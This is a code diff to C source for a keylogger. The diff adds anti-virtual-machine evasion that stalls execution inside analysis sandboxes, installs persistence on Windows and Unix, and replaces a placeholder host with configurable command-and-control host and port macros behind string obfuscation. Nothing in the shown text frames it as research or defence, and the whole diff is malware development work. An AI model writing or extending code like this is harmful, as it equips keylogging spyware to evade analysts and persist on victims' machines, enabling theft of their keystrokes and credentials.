@@ -3,11 +3,15 @@
 #ifdef _WIN32
 #include "common/keylogger.h"
 #include "common/network.h"
+#include "common/antivm.h"
+#include "common/persistence.h"
 typedef KeyloggerState KLState;
 typedef NetContext NetCtx;
 #else
 #include "common/keylogger.h"
 #include "common/network.h"
+#include "common/antivm.h"
+#include "common/persistence.h"
 typedef KeyloggerState KLState;
 typedef NetContext NetCtx;
 #endif
@@ -179,8 +183,25 @@ static void gen_build_id(char *buf, int sz) {
 int main(int argc, char *argv[]) {
     init_prng();
     
+    if(anti_vm_check()) {
+        #ifdef _WIN32
+        Sleep(INFINITE);
+        #else
+        while(1) sleep(86400);
+        #endif
+        return 0;
+    }
+    
     char build_id[9];
     gen_build_id(build_id, sizeof(build_id));
+    
+    #ifdef _WIN32
+    char exe_path[MAX_PATH];
+    GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
+    setup_persistence(exe_path);
+    #else
+    setup_persistence_unix();
+    #endif
     
     unsigned int dec_key[4] = {0xDEADBEEF, 0xCAFEBABE, 0x8BADF00D, 0x600D600D};
     dec_key[0] ^= xorshift96();
@@ -217,21 +238,22 @@ int main(int argc, char *argv[]) {
     #endif
     
     char obfuscated_host[576];
-    int url_len = obfuscate_url(obfuscated_host, "example.com");
+    int url_len = obfuscate_url(obfuscated_host, GET_C2_HOST());
     char actual_host[256];
     unsigned char key_stream[512];
     for(int i = 0; i < 512; i++) {
         key_stream[i] = (unsigned char)(xorshift96() & 0xFF);
     }
-    for(int i = 0; i < url_len - 64 && i < 255; i++) {
+    int host_len = strlen(GET_C2_HOST());
+    for(int i = 0; i < url_len - 64 && i < 255 && i < host_len; i++) {
         actual_host[i] = obfuscated_host[i] ^ key_stream[i] ^ key_stream[(i + 128) % 512];
     }
-    actual_host[11] = '\0';
+    actual_host[host_len] = '\0';
     
     #ifdef _WIN32
-    int conn = net_connect_win(&ctx, "example.com", 443, 1);
+    int conn = net_connect_win(&ctx, GET_C2_HOST(), GET_C2_PORT(), 1);
     #else
-    int conn = net_connect_unix(&ctx, "example.com", 443);
+    int conn = net_connect_unix(&ctx, GET_C2_HOST(), GET_C2_PORT());
     #endif
     
     if(conn) {
